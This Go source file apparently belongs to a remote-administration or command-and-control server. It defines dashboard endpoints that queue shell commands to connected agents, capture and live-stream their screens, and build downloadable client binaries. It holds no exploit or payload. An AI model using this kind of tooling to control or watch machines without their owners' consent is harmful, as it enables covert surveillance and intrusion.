package transport

import (
	"context"
	"encoding/json"
	"errors"
	"io"
	"mime"
	"net/http"
	"strconv"
	"time"

	"github.com/gorilla/websocket"

	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/clientbuild"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/command"
)

type dashboardHandler struct {
	runtime DashboardRuntime
}

const (
	maxTerminalAPIRequestBytes int64 = 64 << 10
	maxClientBuildRequestBytes int64 = 2 << 10
)

func registerDashboardRoutes(mux *http.ServeMux, runtime DashboardRuntime) {
	handler := dashboardHandler{runtime: runtime}
	mux.HandleFunc("GET /api/clients", handler.listClients)
	mux.HandleFunc("GET /api/clients/stream", handler.streamClients)
	mux.HandleFunc("GET /api/clients/{agentID}/logs", handler.listLogs)
	mux.HandleFunc("GET /api/clients/{agentID}/terminal/sessions", handler.listTerminalSessions)
	mux.HandleFunc("POST /api/clients/{agentID}/terminal/sessions", handler.createTerminalSession)
	mux.HandleFunc("GET /api/clients/{agentID}/terminal/sessions/{sessionID}/entries", handler.listTerminalEntries)
	mux.HandleFunc("DELETE /api/clients/{agentID}/terminal/sessions/{sessionID}", handler.deleteTerminalSession)
	mux.HandleFunc("POST /api/clients/{agentID}/terminal/sessions/{sessionID}/commands", handler.queueTerminalCommand)
	mux.HandleFunc("POST /api/clients/{agentID}/screen/request", handler.requestScreenFrame)
	mux.HandleFunc("GET /api/clients/{agentID}/screen/latest", handler.latestScreenMetadata)
	mux.HandleFunc("GET /api/clients/{agentID}/screen/latest.png", handler.latestScreenImage)
	mux.HandleFunc("GET /api/clients/{agentID}/screen/live", handler.liveScreen)
	mux.HandleFunc("GET /api/clients/{agentID}/screen/stream", handler.streamScreen)
	mux.HandleFunc("POST /api/client-builds", handler.buildClient)
}

func (h dashboardHandler) buildClient(w http.ResponseWriter, r *http.Request) {
	if h.runtime.ClientBuilder == nil {
		writeDashboardJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "client build service unavailable"})
		return
	}

	r.Body = http.MaxBytesReader(w, r.Body, maxClientBuildRequestBytes)
	decoder := json.NewDecoder(r.Body)
	decoder.DisallowUnknownFields()

	var request clientbuild.Request
	if err := decoder.Decode(&request); err != nil || decoder.Decode(&struct{}{}) != io.EOF {
		writeDashboardJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid client build request"})
		return
	}

	if err := request.Validate(); err != nil {
		writeDashboardJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid client build profile"})
		return
	}

	artifact, err := h.runtime.ClientBuilder.Build(r.Context(), request)
	if err != nil {
		if errors.Is(err, clientbuild.ErrBusy) {
			writeDashboardJSON(w, http.StatusTooManyRequests, map[string]string{"error": "client build capacity is busy"})
			return
		}

		writeDashboardJSON(w, http.StatusInternalServerError, map[string]string{"error": "client build failed"})

		return
	}

	w.Header().Set("Cache-Control", "no-store")
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", mime.FormatMediaType("attachment", map[string]string{"filename": artifact.Filename}))
	w.Header().Set("X-Content-Type-Options", "nosniff")
	w.Header().Set("Content-Length", strconv.Itoa(len(artifact.Contents)))
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(artifact.Contents)
}

func (h dashboardHandler) listClients(w http.ResponseWriter, _ *http.Request) {
	writeDashboardJSON(w, http.StatusOK, map[string]any{"clients": dashboardClients(h.runtime.Directory)})
}

func (h dashboardHandler) streamClients(w http.ResponseWriter, r *http.Request) {
	streamDashboardEvents(w, r, clientStreamInterval, func() any {
		return map[string]any{"clients": dashboardClients(h.runtime.Directory)}
	})
}

func (h dashboardHandler) listLogs(w http.ResponseWriter, r *http.Request) {
	agentID := r.PathValue("agentID")
	if _, ok := findClient(h.runtime.Directory, agentID); !ok {
		writeDashboardJSON(w, http.StatusNotFound, map[string]string{"error": "unknown agent"})
		return
	}

	writeDashboardJSON(w, http.StatusOK, map[string]any{"agent_id": agentID, "logs": dashboardLogs(h.runtime.Logs, agentID)})
}

func (h dashboardHandler) listTerminalSessions(w http.ResponseWriter, r *http.Request) {
	agentID := r.PathValue("agentID")
	if !h.requireKnownAgent(w, agentID) || !h.requireTerminalStore(w) {
		return
	}

	writeDashboardJSON(w, http.StatusOK, map[string]any{
		"agent_id": agentID,
		"sessions": h.runtime.Terminals.ListSessions(agentID),
	})
}

func (h dashboardHandler) createTerminalSession(w http.ResponseWriter, r *http.Request) {
	agentID := r.PathValue("agentID")

	client, ok := findClient(h.runtime.Directory, agentID)
	if !ok {
		writeDashboardJSON(w, http.StatusNotFound, map[string]string{"error": "unknown agent"})
		return
	}

	if !h.requireTerminalStore(w) {
		return
	}

	r.Body = http.MaxBytesReader(w, r.Body, maxTerminalAPIRequestBytes)

	var request terminalSessionRequest

	if err := json.NewDecoder(r.Body).Decode(&request); err != nil {
		writeDashboardJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid terminal session request"})
		return
	}

	if request.Shell == "" {
		request.Shell = defaultTerminalShell(client.OSVersion)
	}

	session := h.runtime.Terminals.CreateSession(agentID, request.Label, request.Shell, request.WorkingDirectory)
	writeDashboardJSON(w, http.StatusCreated, map[string]any{"agent_id": agentID, "session": session})
}

func (h dashboardHandler) listTerminalEntries(w http.ResponseWriter, r *http.Request) {
	agentID := r.PathValue("agentID")
	sessionID := r.PathValue("sessionID")

	if !h.requireKnownAgent(w, agentID) || !h.requireTerminalStore(w) || !h.requireTerminalSession(w, agentID, sessionID) {
		return
	}

	writeDashboardJSON(w, http.StatusOK, map[string]any{
		"agent_id": agentID, "session_id": sessionID,
		"entries": h.runtime.Terminals.ListEntries(agentID, sessionID, maxTerminalEntriesPerAgent),
	})
}

func (h dashboardHandler) deleteTerminalSession(w http.ResponseWriter, r *http.Request) {
	agentID := r.PathValue("agentID")
	sessionID := r.PathValue("sessionID")

	if !h.requireKnownAgent(w, agentID) || !h.requireTerminalStore(w) {
		return
	}

	if !h.runtime.Terminals.DeleteSession(agentID, sessionID) {
		writeDashboardJSON(w, http.StatusNotFound, map[string]string{"error": "unknown terminal session"})
		return
	}

	writeDashboardJSON(w, http.StatusOK, map[string]any{
		"status": "deleted", "agent_id": agentID, "session_id": sessionID,
	})
}

func (h dashboardHandler) queueTerminalCommand(w http.ResponseWriter, r *http.Request) {
	agentID := r.PathValue("agentID")
	sessionID := r.PathValue("sessionID")

	if !h.requireOnlineAgent(w, agentID) {
		return
	}

	if h.runtime.CommandQueue == nil || h.runtime.Terminals == nil {
		writeDashboardJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "terminal command path unavailable"})
		return
	}

	session, ok := h.runtime.Terminals.Session(agentID, sessionID)
	if !ok {
		writeDashboardJSON(w, http.StatusNotFound, map[string]string{"error": "unknown terminal session"})
		return
	}

	h.decodeAndQueueTerminalCommand(w, r, agentID, session)
}

func (h dashboardHandler) decodeAndQueueTerminalCommand(w http.ResponseWriter, r *http.Request, agentID string, session TerminalSession) {
	r.Body = http.MaxBytesReader(w, r.Body, maxTerminalAPIRequestBytes)

	var request terminalCommandRequest

	if err := json.NewDecoder(r.Body).Decode(&request); err != nil {
		writeDashboardJSON(w, http.StatusBadRequest, map[string]string{"error": "invalid terminal command request"})
		return
	}

	request.Command = clampText(request.Command, maxLogMessageLen)
	if request.Command == "" {
		writeDashboardJSON(w, http.StatusBadRequest, map[string]string{"error": "command is required"})
		return
	}

	workingDirectory := session.WorkingDirectory
	if request.WorkingDirectory != "" {
		workingDirectory = clampText(request.WorkingDirectory, maxPathLen)
	}

	payload, err := json.Marshal(map[string]string{
		"session_id": session.SessionID, "command": request.Command,
		"shell": session.Shell, "working_directory": workingDirectory,
	})
	if err != nil {
		writeDashboardJSON(w, http.StatusInternalServerError, map[string]string{"error": "terminal payload encode failed"})
		return
	}

	h.enqueueTerminalCommand(w, agentID, session, request.Command, workingDirectory, payload)
}

func (h dashboardHandler) enqueueTerminalCommand(w http.ResponseWriter, agentID string, session TerminalSession, commandText, workingDirectory string, payload json.RawMessage) {
	queued := &command.Envelope{
		Type: string(CommandTypeTerminalRun), Payload: payload, RequestedBy: "website",
		Reason: "Terminal command requested from website dashboard",
	}
	if err := h.runtime.CommandQueue.Enqueue(agentID, queued); err != nil {
		writeDashboardJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "terminal command queue unavailable"})
		return
	}

	entry := TerminalEntry{
		AgentID: agentID, SessionID: session.SessionID, CommandID: queued.CommandID,
		Command: commandText, Shell: session.Shell, WorkingDirectory: workingDirectory,
		Status: "queued", SubmittedAt: time.Now().UTC(),
	}
	h.runtime.Terminals.AppendQueued(entry)
	writeDashboardJSON(w, http.StatusAccepted, map[string]any{
		"status": "queued", "agent_id": agentID, "session_id": session.SessionID,
		"command_id": queued.CommandID, "entry": entry,
	})
}

func (h dashboardHandler) requestScreenFrame(w http.ResponseWriter, r *http.Request) {
	agentID := r.PathValue("agentID")
	if !h.requireOnlineAgent(w, agentID) {
		return
	}

	if h.runtime.CommandQueue == nil {
		writeDashboardJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "command queue unavailable"})
		return
	}

	queued := &command.Envelope{
		Type: string(CommandTypeRequestScreenshot), RequestedBy: "website",
		Reason: "Live screen frame requested from website dashboard",
	}
	if err := h.runtime.CommandQueue.Enqueue(agentID, queued); err != nil {
		writeDashboardJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "screen command queue unavailable"})
		return
	}

	writeDashboardJSON(w, http.StatusAccepted, map[string]any{
		"status": "queued", "command_id": queued.CommandID, "agent_id": agentID,
	})
}

func (h dashboardHandler) latestScreenMetadata(w http.ResponseWriter, r *http.Request) {
	agentID := r.PathValue("agentID")
	frame, ok := latestScreen(h.runtime.Screens, agentID)

	if !ok {
		writeDashboardJSON(w, http.StatusOK, map[string]any{"has_frame": false, "agent_id": agentID})
		return
	}

	writeDashboardJSON(w, http.StatusOK, screenFramePayload(agentID, frame))
}

func (h dashboardHandler) latestScreenImage(w http.ResponseWriter, r *http.Request) {
	frame, ok := latestScreen(h.runtime.Screens, r.PathValue("agentID"))
	if !ok {
		http.NotFound(w, r)
		return
	}

	w.Header().Set("Content-Type", screenContentType(frame))
	w.Header().Set("Cache-Control", "no-store")
	w.WriteHeader(http.StatusOK)
	_, _ = w.Write(frame.Content)
}

func (h dashboardHandler) liveScreen(w http.ResponseWriter, r *http.Request) {
	agentID := r.PathValue("agentID")
	if !h.requireOnlineAgent(w, agentID) || !h.requireLiveScreen(w) {
		return
	}

	agentViewers, totalViewers := h.runtime.Sessions.BeginViewer(agentID)
	if totalViewers > maxLiveViewers {
		h.runtime.Sessions.EndViewer(agentID)
		writeDashboardJSON(w, http.StatusTooManyRequests, map[string]string{"error": "too many live screen viewers"})

		return
	}

	defer h.endScreenViewer(agentID)

	if agentViewers == 1 {
		enqueueScreenStreamCommand(h.runtime.CommandQueue, h.runtime.Sessions, agentID, true)
	}

	upgrader := websocket.Upgrader{CheckOrigin: func(request *http.Request) bool {
		return request.Header.Get("Origin") == h.runtime.DashboardOrigin
	}}

	connection, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}

	defer func() { _ = connection.Close() }()
	h.writeLiveScreenFrames(r.Context(), connection, agentID)
}

func (h dashboardHandler) writeLiveScreenFrames(ctx context.Context, connection *websocket.Conn, agentID string) {
	var after time.Time
	if frame, ok := h.runtime.Screens.Latest(agentID); ok {
		after = frame.CapturedAt

		if err := connection.WriteMessage(websocket.BinaryMessage, frame.Content); err != nil {
			return
		}
	}

	for ctx.Err() == nil {
		frame, ok := h.runtime.Screens.WaitLatestAfter(ctx, agentID, after)
		if !ok {
			return
		}

		after = frame.CapturedAt

		if err := connection.WriteMessage(websocket.BinaryMessage, frame.Content); err != nil {
			return
		}
	}
}

func (h dashboardHandler) streamScreen(w http.ResponseWriter, r *http.Request) {
	agentID := r.PathValue("agentID")
	if !h.requireOnlineAgent(w, agentID) || !h.requireScreenStream(w) {
		return
	}

	flusher, ok := w.(http.Flusher)
	if !ok {
		writeDashboardJSON(w, http.StatusInternalServerError, map[string]string{"error": "streaming unsupported"})
		return
	}

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-store")
	w.Header().Set("Connection", "keep-alive")
	w.WriteHeader(http.StatusOK)
	h.writeScreenStream(r.Context(), w, flusher, agentID)
}

func (h dashboardHandler) writeScreenStream(ctx context.Context, w http.ResponseWriter, flusher http.Flusher, agentID string) {
	var after time.Time
	if frame, ok := h.runtime.Screens.Latest(agentID); ok {
		after = frame.CapturedAt
		writeDashboardSSE(w, "frame", screenFramePayload(agentID, frame))
		flusher.Flush()
	}

	for ctx.Err() == nil {
		frame, ok, keepStreaming := h.requestNextScreenFrame(ctx, w, flusher, agentID, after)
		if !keepStreaming {
			return
		}

		if !ok {
			continue
		}

		after = frame.CapturedAt
		writeDashboardSSE(w, "frame", screenFramePayload(agentID, frame))
		flusher.Flush()
	}
}

func (h dashboardHandler) requestNextScreenFrame(ctx context.Context, w http.ResponseWriter, flusher http.Flusher, agentID string, after time.Time) (ScreenFrame, bool, bool) {
	queued := &command.Envelope{
		Type: string(CommandTypeRequestScreenshot), RequestedBy: "website",
		Reason: "Live screen stream requested from website dashboard",
	}
	if err := h.runtime.CommandQueue.Enqueue(agentID, queued); err != nil {
		writeDashboardSSE(w, "error", map[string]string{"error": "screen command queue unavailable"})
		flusher.Flush()

		return ScreenFrame{}, false, false
	}

	waitContext, cancel := context.WithTimeout(ctx, screenFrameTimeout)
	defer cancel()

	frame, ok := h.runtime.Screens.WaitLatestAfter(waitContext, agentID, after)
	if !ok {
		writeDashboardSSE(w, "waiting", map[string]any{"agent_id": agentID, "status": "waiting_for_frame"})
		flusher.Flush()
	}

	return frame, ok, true
}

func (h dashboardHandler) requireKnownAgent(w http.ResponseWriter, agentID string) bool {
	if _, ok := findClient(h.runtime.Directory, agentID); !ok {
		writeDashboardJSON(w, http.StatusNotFound, map[string]string{"error": "unknown agent"})
		return false
	}

	return true
}

func (h dashboardHandler) requireOnlineAgent(w http.ResponseWriter, agentID string) bool {
	client, ok := findClient(h.runtime.Directory, agentID)
	if !ok {
		writeDashboardJSON(w, http.StatusNotFound, map[string]string{"error": "unknown agent"})
		return false
	}

	if !client.IsOnline {
		writeDashboardJSON(w, http.StatusConflict, map[string]string{"error": "agent is offline"})
		return false
	}

	return true
}

func (h dashboardHandler) requireTerminalStore(w http.ResponseWriter) bool {
	if h.runtime.Terminals == nil {
		writeDashboardJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "terminal store unavailable"})
		return false
	}

	return true
}

func (h dashboardHandler) requireTerminalSession(w http.ResponseWriter, agentID, sessionID string) bool {
	if _, ok := h.runtime.Terminals.Session(agentID, sessionID); !ok {
		writeDashboardJSON(w, http.StatusNotFound, map[string]string{"error": "unknown terminal session"})
		return false
	}

	return true
}

func (h dashboardHandler) requireLiveScreen(w http.ResponseWriter) bool {
	if h.runtime.CommandQueue == nil || h.runtime.Screens == nil || h.runtime.Sessions == nil {
		writeDashboardJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "screen stream unavailable"})
		return false
	}

	return true
}

func (h dashboardHandler) requireScreenStream(w http.ResponseWriter) bool {
	if h.runtime.CommandQueue == nil || h.runtime.Screens == nil {
		writeDashboardJSON(w, http.StatusServiceUnavailable, map[string]string{"error": "screen stream unavailable"})
		return false
	}

	return true
}

func (h dashboardHandler) endScreenViewer(agentID string) {
	remainingAgentViewers, _ := h.runtime.Sessions.EndViewer(agentID)
	if remainingAgentViewers == 0 {
		enqueueScreenStreamCommand(h.runtime.CommandQueue, h.runtime.Sessions, agentID, false)
	}
}
